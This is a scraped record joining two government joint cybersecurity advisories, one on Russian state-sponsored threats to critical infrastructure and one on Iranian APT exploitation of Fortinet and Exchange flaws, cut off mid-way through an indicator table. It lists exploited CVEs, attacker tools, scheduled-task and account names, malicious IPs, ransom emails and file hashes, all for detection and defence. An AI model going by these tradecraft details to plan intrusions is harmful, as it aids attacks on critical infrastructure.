Regularly review reporting on this threat. Consider signing up for CISA notifications to receive timely information on current security issues, vulnerabilities, and high-impact activity.

Resources

For more information on Russian state-sponsored malicious cyber activity, refer to cisa.gov/Russia.
Refer to CISA Analysis Report Strengthening Security Configurations to Defend Against Attackers Targeting Cloud Services for steps for guidance on strengthening your organizations cloud security practices.
Leaders of small businesses and small and local government agencies should see CISA’s Cyber Essentials for guidance on developing an actionable understanding of implementing organizational cybersecurity practices.
Critical infrastructure owners and operators with OT/ICS networks, should review the following resources for additional information:

NSA and CISA joint CSA NSA and CISA Recommend Immediate Actions to Reduce Exposure Across Operational Technologies and Control Systems
CISA factsheet Rising Ransomware Threat to Operational Technology Assets for additional recommendations.



Rewards for Justice Program
If you have information on state-sponsored Russian cyber operations targeting U.S. critical infrastructure, contact the Department of State’s Rewards for Justice Program. You may be eligible for a reward of up to $10 million, which DOS is offering for information leading to the identification or location of any person who, while acting under the direction or control of a foreign government, participates in malicious cyber activity against U.S. critical infrastructure in violation of the Computer Fraud and Abuse Act (CFAA). Contact +1-202-702-7843 on WhatsApp, Signal, or Telegram, or send information via the Rewards for Justice secure Tor-based tips line located on the Dark Web. For more details refer to rewardsforjustice.net/malicious_cyber_activity.
Caveats
The information you have accessed or received is being provided “as is” for informational purposes only. CISA, the FBI, and NSA do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA, the FBI, or NSA.

References

[1]  Joint NCSC-CISA UK Advisory: Further TTPs Associated with SVR Cyber Actors

Revisions

January 11, 2022: Initial Version|January 25, 2022: Updated broken link|February 28, 2022: Updated broken link






This product is provided subject to this Notification and this Privacy & Use policy.


","{'TA0003', 'T1212', 'T1558.003', 'T1555', 'TA0006', 'T1190', 'TA0043', 'TA0011', 'T1110.003', 'T1078', 'T1595.002', 'T1552.004', 'TA0001', 'TA0002', 'T1110.001', 'T1598', 'T1003.003', 'T1587.001', 'TA0042', 'T1059.003', 'T1195.002', 'T1090.003'}","




Summary

Actions Critical Infrastructure Organizations Should Implement to Immediately Strengthen Their Cyber Posture.
• Patch all systems. Prioritize patching known exploited vulnerabilities.
• Implement multi-factor authentication.
• Use antivirus software.
• Develop internal contact lists and surge support.
Note: this advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework, version 10. See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques.
This joint Cybersecurity Advisory (CSA)—authored by the Cybersecurity and Infrastructure Security Agency (CISA), Federal Bureau of Investigation (FBI), and National Security Agency (NSA)—is part of our continuing cybersecurity mission to warn organizations of cyber threats and help the cybersecurity community reduce the risk presented by these threats. This CSA provides an overview of Russian state-sponsored cyber operations; commonly observed tactics, techniques, and procedures (TTPs); detection actions; incident response guidance; and mitigations. This overview is intended to help the cybersecurity community reduce the risk presented by these threats.
CISA, the FBI, and NSA encourage the cybersecurity community—especially critical infrastructure network defenders—to adopt a heightened state of awareness and to conduct proactive threat hunting, as outlined in the Detection section. Additionally, CISA, the FBI, and NSA strongly urge network defenders to implement the recommendations listed below and detailed in the Mitigations section. These mitigations will help organizations improve their functional resilience by reducing the risk of compromise or severe business degradation.

Be prepared. Confirm reporting processes and minimize personnel gaps in IT/OT security coverage. Create, maintain, and exercise a cyber incident response plan, resilience plan, and continuity of operations plan so that critical functions and operations can be kept running if technology systems are disrupted or need to be taken offline.
Enhance your organization’s cyber posture. Follow best practices for identity and access management, protective controls and architecture, and vulnerability and configuration management.
Increase organizational vigilance. Stay current on reporting on this threat. Subscribe to CISA’s mailing list and feeds to receive notifications when CISA releases information about a security topic or threat.

CISA, the FBI, and NSA encourage critical infrastructure organization leaders to review CISA Insights: Preparing for and Mitigating Cyber Threats for information on reducing cyber threats to their organization.
Click here for a PDF version of this report.

Technical Details

Historically, Russian state-sponsored advanced persistent threat (APT) actors have used common but effective tactics—including spearphishing, brute force, and exploiting known vulnerabilities against accounts and networks with weak security—to gain initial access to target networks. Vulnerabilities known to be exploited by Russian state-sponsored APT actors for initial access include:

CVE-2018-13379 FortiGate VPNs
CVE-2019-1653 Cisco router
CVE-2019-2725 Oracle WebLogic Server
CVE-2019-7609 Kibana
CVE-2019-9670 Zimbra software
CVE-2019-10149 Exim Simple Mail Transfer Protocol
CVE-2019-11510 Pulse Secure
CVE-2019-19781 Citrix
CVE-2020-0688 Microsoft Exchange
CVE-2020-4006 VMWare (note: this was a zero-day at time.)
CVE-2020-5902 F5 Big-IP
CVE-2020-14882 Oracle WebLogic
CVE-2021-26855 Microsoft Exchange (Note: this vulnerability is frequently observed used in conjunction with CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065)

Russian state-sponsored APT actors have also demonstrated sophisticated tradecraft and cyber capabilities by compromising third-party infrastructure, compromising third-party software, or developing and deploying custom malware. The actors have also demonstrated the ability to maintain persistent, undetected, long-term access in compromised environments—including cloud environments—by using legitimate credentials.
In some cases, Russian state-sponsored cyber operations against critical infrastructure organizations have specifically targeted operational technology (OT)/industrial control systems (ICS) networks with destructive malware. See the following advisories and alerts for information on historical Russian state-sponsored cyber-intrusion campaigns and customized malware that have targeted ICS:

ICS Advisory ICS Focused Malware – Havex
ICS Alert Ongoing Sophisticated Malware Campaign Compromising ICS (Update E)
ICS Alert Cyber-Attack Against Ukrainian Critical Infrastructure
Technical Alert CrashOverride Malware
CISA MAR HatMan: Safety System Targeted Malware (Update B)
CISA ICS Advisory Schneider Electric Triconex Tricon (Update B)

Russian state-sponsored APT actors have used sophisticated cyber capabilities to target a variety of U.S. and international critical infrastructure organizations, including those in the Defense Industrial Base as well as the Healthcare and Public Health, Energy, Telecommunications, and Government Facilities Sectors. High-profile cyber activity publicly attributed to Russian state-sponsored APT actors by U.S. government reporting and legal actions includes:

Russian state-sponsored APT actors targeting state, local, tribal, and territorial (SLTT) governments and aviation networks, September 2020, through at least December 2020. Russian state-sponsored APT actors targeted dozens of SLTT government and aviation networks. The actors successfully compromised networks and exfiltrated data from multiple victims.
Russian state-sponsored APT actors’ global Energy Sector intrusion campaign, 2011 to 2018. These Russian state-sponsored APT actors conducted a multi-stage intrusion campaign in which they gained remote access to U.S. and international Energy Sector networks, deployed ICS-focused malware, and collected and exfiltrated enterprise and ICS-related data.
Russian state-sponsored APT actors’ campaign against Ukrainian critical infrastructure, 2015 and 2016. Russian state-sponsored APT actors conducted a cyberattack against Ukrainian energy distribution companies, leading to multiple companies experiencing unplanned power outages in December 2015. The actors deployed BlackEnergy malware to steal user credentials and used its destructive malware component, KillDisk, to make infected computers inoperable. In 2016, these actors conducted a cyber-intrusion campaign against a Ukrainian electrical transmission company and deployed CrashOverride malware specifically designed to attack power grids.

For more information on recent and historical Russian state-sponsored malicious cyber activity, see the referenced products below or cisa.gov/Russia.

Joint FBI-DHS-CISA CSA Russian Foreign Intelligence Service (SVR) Cyber Operations: Trends and Best Practices for Network Defenders
Joint NSA-FBI-CISA CSA Russian GRU Conducting Global Brute Force Campaign to Compromise Enterprise and Cloud Environments
Joint FBI-CISA CSA Russian State-Sponsored Advanced Persistent Threat Actor Compromises U.S. Government Targets
Joint CISA-FBI CSA APT Actors Chaining Vulnerabilities against SLTT, Critical Infrastructure, and Elections Organizations
CISA’s webpage Remediating Networks Affected by the SolarWinds and Active Directory/M365 Compromise
CISA Alert Russian Government Cyber Activity Targeting Energy Sector and Other Critical Infrastructure Sectors
CISA ICS Alert: Cyber-Attack Against Ukrainian Critical Infrastructure

Table 1 provides common, publicly known TTPs employed by Russian state-sponsored APT actors, which map to the MITRE ATT&CK for Enterprise framework, version 10. Note: these lists are not intended to be all inclusive. Russian state-sponsored actors have modified their TTPs before based on public reporting.,1, Therefore, CISA, the FBI, and NSA anticipate the Russian state-sponsored actors may modify their TTPs as they deem necessary to reduce their risk of detection. 
Table 1: Common Tactics and Techniques Employed by Russian State-Sponsored APT Actors

 
For additional enterprise TTPs used by Russian state-sponsored APT actors, see the ATT&CK for Enterprise pages on APT29, APT28, and the Sandworm Team, respectively. For information on ICS TTPs see the ATT&CK for ICS pages on the Sandworm Team, BlackEnergy 3 malware, CrashOveride malware, BlackEnergy’s KillDisk component, and NotPetya malware.
Detection
Given Russian state-sponsored APT actors demonstrated capability to maintain persistent, long-term access in compromised enterprise and cloud environments, CISA, the FBI, and NSA encourage all critical infrastructure organizations to:

Implement robust log collection and retention. Without a centralized log collection and monitoring capability, organizations have limited ability to investigate incidents or detect the threat actor behavior described in this advisory. Depending on the environment, examples include:

Native tools such as M365’s Sentinel. 
Third-party tools, such as Sparrow, Hawk, or CrowdStrike's Azure Reporting Tool (CRT), to review Microsoft cloud environments and to detect unusual activity, service principals, and application activity. Note: for guidance on using these and other detection tools, refer to CISA Alert Detecting Post-Compromise Threat Activity in Microsoft Cloud Environments.




Look for behavioral evidence or network and host-based artifacts from known Russian state-sponsored TTPs. See table 1 for commonly observed TTPs. 

To detect password spray activity, review authentication logs for system and application login failures of valid accounts. Look for multiple, failed authentication attempts across multiple accounts.
To detect use of compromised credentials in combination with a VPS, follow the below steps:

Look for suspicious “impossible logins,” such as logins with changing username, user agent strings, and IP address combinations or logins where IP addresses do not align to the expected user’s geographic location.
Look for one IP used for multiple accounts, excluding expected logins.
Look for “impossible travel.” Impossible travel occurs when a user logs in from multiple IP addresses that are a significant geographic distance apart (i.e., a person could not realistically travel between the geographic locations of the two IP addresses during the time period between the logins). Note: implementing this detection opportunity can result in false positives if legitimate users apply VPN solutions before connecting into networks.
Look for processes and program execution command-line arguments that may indicate credential dumping, especially attempts to access or copy the ntds.dit file from a domain controller. 
Look for suspicious privileged account use after resetting passwords or applying user account mitigations. 
Look for unusual activity in typically dormant accounts.
Look for unusual user agent strings, such as strings not typically associated with normal user activity, which may indicate bot activity.






For organizations with OT/ICS systems: 

Take note of unexpected equipment behavior; for example, unexpected reboots of digital controllers and other OT hardware and software. 
Record delays or disruptions in communication with field equipment or other OT devices. Determine if system parts or components are lagging or unresponsive.



Incident Response
Organizations detecting potential APT activity in their IT or OT networks should:

Immediately isolate affected systems. 
Secure backups. Ensure your backup data is offline and secure. If possible, scan your backup data with an antivirus program to ensure it is free of malware.
Collect and review relevant logs, data, and artifacts.
Consider soliciting support from a third-party IT organization to provide subject matter expertise, ensure the actor is eradicated from the network, and avoid residual issues that could enable follow-on exploitation.
Report incidents to CISA and/or the FBI via your local FBI field office or the FBI’s 24/7 CyWatch at (855) 292-3937 or CyWatch@fbi.gov.

Note: for OT assets, organizations should have a resilience plan that addresses how to operate if you lose access to—or control of—the IT and/or OT environment. Refer to the Mitigations section for more information.
See the joint advisory from Australia, Canada, New Zealand, the United Kingdom, and the United States on Technical Approaches to Uncovering and Remediating Malicious Activity for guidance on hunting or investigating a network, and for common mistakes in incident handling. CISA, the FBI, and NSA encourage critical infrastructure owners and operators to see CISA’s Federal Government Cybersecurity Incident and Vulnerability Response Playbooks. Although tailored to federal civilian branch agencies, these playbooks provide operational procedures for planning and conducting cybersecurity incident and vulnerability response activities and detail each step for both incident and vulnerability response.  
Note: organizations should document incident response procedures in a cyber incident response plan, which organizations should create and exercise (as noted in the Mitigations section). 

Mitigations

CISA, the FBI, and NSA encourage all organizations to implement the following recommendations to increase their cyber resilience against this threat.
Be Prepared
Confirm Reporting Processes and Minimize Coverage Gaps

Develop internal contact lists. Assign main points of contact for a suspected incident as well as roles and responsibilities and ensure personnel know how and when to report an incident.
Minimize gaps in IT/OT security personnel availability by identifying surge support for responding to an incident. Malicious cyber actors are known to target organizations on weekends and holidays when there are gaps in organizational cybersecurity—critical infrastructure organizations should proactively protect themselves by minimizing gaps in coverage.
Ensure IT/OT security personnel monitor key internal security capabilities and can identify anomalous behavior. Flag any identified IOCs and TTPs for immediate response. (See table 1 for commonly observed TTPs).

Create, Maintain, and Exercise a Cyber Incident Response, Resilience Plan, and Continuity of Operations Plan

Create, maintain, and exercise a cyber incident response and continuity of operations plan.
Ensure personnel are familiar with the key steps they need to take during an incident and are positioned to act in a calm and unified manner. Key questions:

Do personnel have the access they need?
Do they know the processes?


For OT assets/networks,

Identify a resilience plan that addresses how to operate if you lose access to—or control of—the IT and/or OT environment.

Identify OT and IT network interdependencies and develop workarounds or manual controls to ensure ICS networks can be isolated if the connections create risk to the safe and reliable operation of OT processes. Regularly test contingency plans, such as manual controls, so that safety critical functions can be maintained during a cyber incident. Ensure that the OT network can operate at necessary capacity even if the IT network is compromised.


Regularly test manual controls so that critical functions can be kept running if ICS or OT networks need to be taken offline.
Implement data backup procedures on both the IT and OT networks. Backup procedures should be conducted on a frequent, regular basis. Regularly test backup procedures and ensure that backups are isolated from network connections that could enable the spread of malware.
In addition to backing up data, develop recovery documents that include configuration settings for common devices and critical OT equipment. This can enable more efficient recovery following an incident.



Enhance your Organization’s Cyber Posture
CISA, the FBI, and NSA recommend organizations apply the best practices below for identity and access management, protective controls and architecture, and vulnerability and configuration management.
Identity and Access Management

Require multi-factor authentication for all users, without exception.
Require accounts to have strong passwords and do not allow passwords to be used across multiple accounts or stored on a system to which an adversary may have access.
Secure credentials. Russian state-sponsored APT actors have demonstrated their ability to maintain persistence using compromised credentials.

Use virtualizing solutions on modern hardware and software to ensure credentials are securely stored.
Disable the storage of clear text passwords in LSASS memory.
Consider disabling or limiting New Technology Local Area Network Manager (NTLM) and WDigest Authentication.
Implement Credential Guard for Windows 10 and Server 2016 (Refer to Microsoft: Manage Windows Defender Credential Guard for more information). For Windows Server 2012R2, enable Protected Process Light for Local Security Authority (LSA).
Minimize the Active Directory attack surface to reduce malicious ticket-granting activity. Malicious activity such as “Kerberoasting” takes advantage of Kerberos’ TGS and can be used to obtain hashed credentials that attackers attempt to crack.


Set a strong password policy for service accounts.
Audit Domain Controllers to log successful Kerberos TGS requests and ensure the events are monitored for anomalous activity.  

Secure accounts.
Enforce the principle of least privilege. Administrator accounts should have the minimum permission they need to do their tasks.
Ensure there are unique and distinct administrative accounts for each set of administrative tasks.
Create non-privileged accounts for privileged users and ensure they use the non- privileged accounts for all non-privileged access (e.g., web browsing, email access).



Protective Controls and Architecture

Identify, detect, and investigate abnormal activity that may indicate lateral movement by a threat actor or malware. Use network monitoring tools and host-based logs and monitoring tools, such as an endpoint detection and response (EDR) tool. EDR tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host.
Enable strong spam filters.

Enable strong spam filters to prevent phishing emails from reaching end users.
Filter emails containing executable files to prevent them from reaching end users.
Implement a user training program to discourage users from visiting malicious websites or opening malicious attachments.



Note: CISA, the FBI, and NSA also recommend, as a longer-term effort, that critical infrastructure organizations implement network segmentation to separate network segments based on role and functionality. Network segmentation can help prevent lateral movement by controlling traffic flows between—and access to—various subnetworks.

Appropriately implement network segmentation between IT and OT networks. Network segmentation limits the ability of adversaries to pivot to the OT network even if the IT network is compromised. Define a demilitarized zone that eliminates unregulated communication between the IT and OT networks.
Organize OT assets into logical zones by taking into account criticality, consequence, and operational necessity. Define acceptable communication conduits between the zones and deploy security controls to filter network traffic and monitor communications between zones. Prohibit ICS protocols from traversing the IT network.

Vulnerability and Configuration Management

Update software, including operating systems, applications, and firmware on IT network assets, in a timely manner. Prioritize patching known exploited vulnerabilities, especially those CVEs identified in this CSA, and then critical and high vulnerabilities that allow for remote code execution or denial-of-service on internet-facing equipment.

Consider using a centralized patch management system. For OT networks, use a risk-based assessment strategy to determine the OT network assets and zones that should participate in the patch management program.  
Consider signing up for CISA’s cyber hygiene services, including vulnerability scanning, to help reduce exposure to threats. CISA’s vulnerability scanning service evaluates external network presence by executing continuous scans of public, static IP addresses for accessible services and vulnerabilities.


Use industry recommended antivirus programs.

Set antivirus/antimalware programs to conduct regular scans of IT network assets using up-to-date signatures.
Use a risk-based asset inventory strategy to determine how OT network assets are identified and evaluated for the presence of malware.


Implement rigorous configuration management programs. Ensure the programs can track and mitigate emerging threats. Review system configurations for misconfigurations and security weaknesses.
Disable all unnecessary ports and protocols

Review network security device logs and determine whether to shut off unnecessary ports and protocols. Monitor common ports and protocols for command and control  activity.
Turn off or disable any unnecessary services (e.g., PowerShell) or functionality within devices.


Ensure OT hardware is in read-only mode.

Increase Organizational Vigilance

Regularly review reporting on this threat. Consider signing up for CISA notifications to receive timely information on current security issues, vulnerabilities, and high-impact activity.

Resources

For more information on Russian state-sponsored malicious cyber activity, refer to cisa.gov/Russia.
Refer to CISA Analysis Report Strengthening Security Configurations to Defend Against Attackers Targeting Cloud Services for steps for guidance on strengthening your organizations cloud security practices.
Leaders of small businesses and small and local government agencies should see CISA’s Cyber Essentials for guidance on developing an actionable understanding of implementing organizational cybersecurity practices.
Critical infrastructure owners and operators with OT/ICS networks, should review the following resources for additional information:

NSA and CISA joint CSA NSA and CISA Recommend Immediate Actions to Reduce Exposure Across Operational Technologies and Control Systems
CISA factsheet Rising Ransomware Threat to Operational Technology Assets for additional recommendations.



Rewards for Justice Program
If you have information on state-sponsored Russian cyber operations targeting U.S. critical infrastructure, contact the Department of State’s Rewards for Justice Program. You may be eligible for a reward of up to $10 million, which DOS is offering for information leading to the identification or location of any person who, while acting under the direction or control of a foreign government, participates in malicious cyber activity against U.S. critical infrastructure in violation of the Computer Fraud and Abuse Act (CFAA). Contact +1-202-702-7843 on WhatsApp, Signal, or Telegram, or send information via the Rewards for Justice secure Tor-based tips line located on the Dark Web. For more details refer to rewardsforjustice.net/malicious_cyber_activity.
Caveats
The information you have accessed or received is being provided “as is” for informational purposes only. CISA, the FBI, and NSA do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA, the FBI, or NSA.

References,1,  Joint NCSC-CISA UK Advisory: Further TTPs Associated with SVR Cyber Actors

Revisions

January 11, 2022: Initial Version|January 25, 2022: Updated broken link|February 28, 2022: Updated broken link






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-011a
58,"




Summary

Actions to Take Today to Protect Against Iranian State-Sponsored Malicious Cyber Activity
• Immediately patch software affected by the following vulnerabilities: CVE-2021-34473, 2018-13379, 2020-12812, and 2019-5591.
• Implement multi-factor authentication.
• Use strong, unique passwords.v
Note: this advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework, version 10. See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques.
This joint cybersecurity advisory is the result of an analytic effort among the Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), the Australian Cyber Security Centre (ACSC), and the United Kingdom’s National Cyber Security Centre (NCSC) to highlight ongoing malicious cyber activity by an advanced persistent threat (APT) group that FBI, CISA, ACSC, and NCSC assess is associated with the government of Iran. FBI and CISA have observed this Iranian government-sponsored APT group exploit Fortinet vulnerabilities since at least March 2021 and a Microsoft Exchange ProxyShell vulnerability since at least October 2021 to gain initial access to systems in advance of follow-on operations, which include deploying ransomware. ACSC is also aware this APT group has used the same Microsoft Exchange vulnerability in Australia.
The Iranian government-sponsored APT actors are actively targeting a broad range of victims across multiple U.S. critical infrastructure sectors, including the Transportation Sector and the Healthcare and Public Health Sector, as well as Australian organizations. FBI, CISA, ACSC, and NCSC assess the actors are focused on exploiting known vulnerabilities rather than targeting specific sectors. These Iranian government-sponsored APT actors can leverage this access for follow-on operations, such as data exfiltration or encryption, ransomware, and extortion.
This advisory provides observed tactics and techniques, as well as indicators of compromise (IOCs) that FBI, CISA, ACSC, and NCSC assess are likely associated with this Iranian government-sponsored APT activity.
The FBI, CISA, ACSC, and NCSC urge critical infrastructure organizations to apply the recommendations listed in the Mitigations section of this advisory to mitigate risk of compromise from Iranian government-sponsored cyber actors.
For a downloadable copy of IOCs, see AA21-321A.stix.
For more information on Iranian government-sponsored malicious cyber activity, see us-cert.cisa.gov/Iran.
Click here for a PDF version of this report.

Technical Details

Threat Actor Activity
Since at least March 2021, the FBI and CISA have observed Iranian government-sponsored APT actors leverage Microsoft Exchange and Fortinet vulnerabilities to target a broad range of victims across multiple critical infrastructure sectors in furtherance of malicious activities. Observed activity includes the following.

In March 2021, the FBI and CISA observed these Iranian government-sponsored APT actors scanning devices on ports 4443, 8443, and 10443 for Fortinet FortiOS vulnerability CVE-2018-13379, and enumerating devices for FortiOS vulnerabilities CVE-2020-12812 and CVE-2019-5591. The Iranian Government-sponsored APT actors likely exploited these vulnerabilities to gain access to vulnerable networks. Note: for previous FBI and CISA reporting on this activity, refer to Joint Cybersecurity Advisory: APT Actors Exploit Vulnerabilities to Gain Initial Access for Future Attacks.
In May 2021, these Iranian government-sponsored APT actors exploited a Fortigate appliance to access a webserver hosting the domain for a U.S. municipal government. The actors likely created an account with the username elie to further enable malicious activity. Note: for previous FBI reporting on this activity, refer to FBI FLASH: APT Actors Exploiting Fortinet Vulnerabilities to Gain Initial Access for Malicious Activity.
In June 2021, these APT actors exploited a Fortigate appliance to access environmental control networks associated with a U.S.-based hospital specializing in healthcare for children. The Iranian government-sponsored APT actors likely leveraged a server assigned to IP addresses 91.214.124[.]143 and 162.55.137[.]20—which FBI and CISA judge are associated with Iranian government cyber activity—to further enable malicious activity against the hospital’s network. The APT actors accessed known user accounts at the hospital from IP address 154.16.192[.]70, which FBI and CISA judge is associated with government of Iran offensive cyber activity.
As of October 2021, these APT actors have leveraged a Microsoft Exchange ProxyShell vulnerability—CVE-2021-34473—to gain initial access to systems in advance of follow-on operations.

ACSC considers that this APT group has also used the same Microsoft Exchange vulnerability (CVE-2021-34473) in Australia.
MITRE ATT&CK Tactics and Techniques
FBI, CISA, ACSC, and NCSC assess the following tactics and techniques are associated with this activity.
Resource Development [TA0042]
The APT actors have used the following malicious and legitimate tools [T1588.001, T1588.002] for a variety of tactics across the enterprise spectrum.

Mimikatz for credential theft [TA0006]
WinPEAS for privilege escalation [TA0004]
SharpWMI (Windows Management Instrumentation)
WinRAR for archiving collected data [TA0009, T1560.001]
FileZilla for transferring files [TA0010]

Initial Access [TA0001]
The Iranian government-sponsored APT actors gained initial access by exploiting vulnerabilities affecting Microsoft Exchange servers (CVE-2021-34473) and Fortinet devices (CVE-2018-13379, CVE-2020-12812, and CVE-2019-5591) [T1190].
Execution [TA0002]
The Iranian government-sponsored APT actors may have made modifications to the Task Scheduler [T1053.005]. These modifications may display as unrecognized scheduled tasks or actions. Specifically, the below established tasks may be associated with this activity:

SynchronizeTimeZone
GoogleChangeManagement
MicrosoftOutLookUpdater
MicrosoftOutLookUpdateSchedule

Persistence [TA0003]
The Iranian government-sponsored APT actors may have established new user accounts on domain controllers, servers, workstations, and active directories [T1136.001, T1136.002]. Some of these accounts appear to have been created to look similar to other existing accounts on the network, so specific account names may vary per organization. In addition to unrecognized user accounts or accounts established to masquerade as existing accounts, the following account usernames may be associated with this activity:

Support
Help
elie
WADGUtilityAccount

Exfiltration [TA0010]
The FBI and CISA observed outbound File Transfer Protocol (FTP) transfers over port 443.
Impact [TA0040]
The APT actors forced BitLocker activation on host networks to encrypt data [T1486]. The corresponding threatening notes were either sent to the victim or left on the victim network as a .txt file. The ransom notes included ransom demands and the following contact information. 

sar_addr@protonmail[.]com
WeAreHere@secmail[.]pro
nosterrmann@mail[.]com
nosterrmann@protonmail[.]com 

Detection
The FBI, CISA, ACSC, and NCSC recommend that organizations using Microsoft Exchange servers and Fortinet investigate potential suspicious activity in their networks. 

Search for IOCs. Collect known-bad IOCs and search for them in network and host artifacts. Note: refer to Appendix A for IOCs.
Investigate exposed Microsoft Exchange servers (both patched and unpatched) for compromise. 
Investigate changes to Remote Desktop Protocol (RDP), firewall, and Windows Remote Management (WinRM) configurations that may allow attackers to maintain persistent access. 
Review domain controllers, servers, workstations, and active directories for new or unrecognized user accounts.
Review Task Scheduler for unrecognized scheduled tasks. Additionally, manually review operating-system defined or recognized scheduled tasks for unrecognized “actions” (for example, review the steps each scheduled task is expected to perform).
Review antivirus logs for indications they were unexpectedly turned off.
Look for WinRAR and FileZilla in unexpected locations. 

Note: for additional approaches on uncovering malicious cyber activity, see joint advisory Technical Approaches to Uncovering and Remediating Malicious Activity, authored by CISA and the cybersecurity authorities of Australia, Canada, New Zealand, and the United Kingdom. 

Mitigations

The FBI, CISA, ACSC, and NCSC urge network defenders to apply the following mitigations to reduce the risk of compromise by this threat.
Patch and Update Systems

Install updates/patch operating systems, software, and firmware as soon as updates/patches are released. 
Immediately patch software affected by vulnerabilities identified in this advisory: CVE-2021-34473, CVE-2018-13379, CVE-2020-12812, and CVE-2019-5591.

Evaluate and Update Blocklists and Allowlists

Regularly evaluate and update blocklists and allowlists.
If FortiOS is not used by your organization, add the key artifact files used by FortiOS to your organization’s execution blocklist. Any attempts to install or run this program and its associated files should be prevented.

Implement and Enforce Backup and Restoration Policies and Procedures

Regularly back up data, air gap, and password protect backup copies offline.
Ensure copies of critical data are not accessible for modification or deletion from the system where the data resides. 
Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, secure location (e.g., hard drive, storage device, the cloud). 

Implement Network Segmentation

Implement network segmentation to restrict adversary’s lateral movement. 

Secure User Accounts

Audit user accounts with administrative privileges and configure access controls under the principles of least privilege and separation of duties. 
Require administrator credentials to install software. 

Implement Multi-Factor Authentication

Use multifactor authentication where possible, particularly for webmail, virtual private networks (VPNs), and accounts that access critical systems. 

Use Strong Passwords

Require all accounts with password logins to have strong, unique passwords.

Secure and Monitor RDP and other Potentially Risky Services

If you use RDP, restrict it to limit access to resources over internal networks.
Disable unused remote access/RDP ports.
Monitor remote access/RDP logs. 

Use Antivirus Programs

Install and regularly update antivirus and anti-malware software on all hosts. 

Secure Remote Access

Only use secure networks and avoid using public Wi-Fi networks. 
Consider installing and using a VPN for remote access.

Reduce Risk of Phishing

Consider adding an email banner to emails received from outside your organization.
Disable hyperlinks in received emails

Resources

For more information on Iranian government-sponsored malicious cyber activity, see us-cert.cisa.gov/Iran. 
For information and resources on protecting against and responding to ransomware, refer to StopRansomware.gov, a centralized, whole-of-government webpage providing ransomware resources and alerts.
The joint advisory from the cybersecurity authorities of Australia, Canada, New Zealand, the United Kingdom, and the United States: Technical Approaches to Uncovering and Remediating Malicious Activity provides additional guidance when hunting or investigating a network and common mistakes to avoid in incident handling.
CISA offers a range of no-cost cyber hygiene services to help critical infrastructure organizations assess, identify, and reduce their exposure to threats, including ransomware. By requesting these services, organizations of any size could find ways to reduce their risk and mitigate attack vectors.
The U.S. Department of State’s Rewards for Justice (RFJ) program offers a reward of up to $10 million for reports of foreign government malicious activity against U.S. critical infrastructure. See the RFJ website for more information and how to report information securely.
ACSC can provide tailored cyber security advice and assistance, reporting, and incident response support at cyber.gov.au and via 1300 292 371 (1300 CYBER1).

Appendix A: Indicators of Compromise
IP addresses and executables files are listed below. For a downloadable copy of IOCs, see AA21-321A.stix.
IP Addresses

91.214.124[.]143 
162.55.137[.]20 
154.16.192[.]70

Executable Files 
Executable files observed in this activity are identified in table 1.
Table 1: Executable Files 



Filename:
MicrosoftOutLookUpdater[.]exe 




MD5:
1444884faed804667d8c2bfa0d63ab13


SHA-1:
95E045446EFB8C9983EBFD85E39B4BE5D92C7A2A


SHA-256:
c51fe5073bd493c7e8d83365aace3f9911437a0f2ae80042ba01ea46b55d2624


SHA-512:
6451077B99C5F8ECC5C0CA88FE272156296BEB91218B39AE28A086DBA5E7E39813F044F9AF0FEDBB260941B1CD52FA237C098CBF4B2A822F08E3E98E934D0ECF


Filename:
MicrosoftOutlookUpdater.bat


MD5:
1A44368EB5BF68688BA4B4357BDC874F


SHA-1
FA36FEBFD5A5CA0B3A1B19005B952683A7188A13


SHA-256
3A08D0CB0FF4D95ED0896F22F4DA8755525C243C457BA6273E08453E0E3AC4C4


SHA-512
70AA89449EB5DA1D84B70D114EF9D24CB74751CE12D12C783251E51775C89FDCE61B4265B43B1D613114D6A85E9C75927B706F39C576DBB036079C7E8CAF28B2


Filename:
MicrosoftOutlookUpdater.xml


MD5:
AA40C49E309959FA04B7E5AC111BB770


SHA-1
F1D90E10E6E3654654E0A677763C9767C913F8F0


SHA-256
5C818FE43F05F4773AD20E0862280B0D5C66611BB12459A08442F55F148400A6


SHA-512
E55A86159F2E869DCDB64FDC730DA893718E20D65A04071770BD32CAE75FF8C34704BDF9F72EF055A3B362759EDE3682B3883C4D9BCF87013076638664E8078E


Filename:
GoogleChangeManagement.xml


MD5:
AF2D86042602CBBDCC7F1E8EFA6423F9


SHA-1
CDCD97F946B78831A9B88B0A5CD785288DC603C1


SHA-256
4C691CCD811B868D1934B4B8E9ED6D5DB85EF35504F85D860E8FD84C547EBF1D


SHA-512
6473DAC67B75194DEEAEF37103BBA17936F6C16FFCD2A7345A5A46756996FAD748A97F36F8FD4BE4E1F264ECE313773CC5596099D68E71344D8135F50E5D8971


Filename:
Connector3.exe


MD5:
e64064f76e59dea46a0768993697ef2f


Filename:
Audio.exe or frpc.exe


MD5:
b90f05b5e705e0b0cb47f51b985f84db


SHA-1
5bd0690247dc1e446916800af169270f100d089b


SHA-256:
28332bdbfaeb8333dad5ada3c10819a1a015db9106d5e8a74beaaf03797511aa


Vhash:
017067555d5d15541az28!z


Authentihash:
ed463da90504f3adb43ab82044cddab8922ba029511da9ad5a52b8c20bda65ee


Imphash:
93a138801d9601e4c36e6274c8b9d111


SSDEEP:
98304:MeOuFco2Aate8mjOaFEKC8KZ1F4ANWyJXf/X+g4:MeHFV2AatevjOaDC8KZ1xNWy93U


Note:

Identical to “frpc.exe” available at:
https://github[.]com/fatedier/frp/releases/download/v0.34.3/frp_0.34.3_windows_amd64.zip



Filename:
Frps.exe


MD5:
26f330dadcdd717ef575aa5bfcdbe76a


SHA-1
c4160aa55d092cf916a98f3b3ee8b940f2755053


SHA-256:
